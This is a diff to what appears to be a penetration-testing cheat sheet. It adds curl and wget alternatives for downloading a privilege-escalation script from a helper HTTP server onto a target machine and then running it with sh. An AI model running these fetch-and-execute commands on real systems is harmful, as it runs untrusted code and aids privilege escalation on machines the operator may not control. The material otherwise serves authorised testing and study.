@@ -20,7 +20,9 @@ python3 -m http.server 8000 #python3
 python2 -m SimpleHTTPServer 8000 #python2
 
 # Target:
-curl -LJO <Host>:8000/privesc.sh
+curl -LJO <Host>:8000/privesc.sh #or
+curl <Host>:8000/privesc.sh > privesc.sh #or
+wget <Host>:8000/privesc.sh
 sh privesc.sh -h
 ```
 
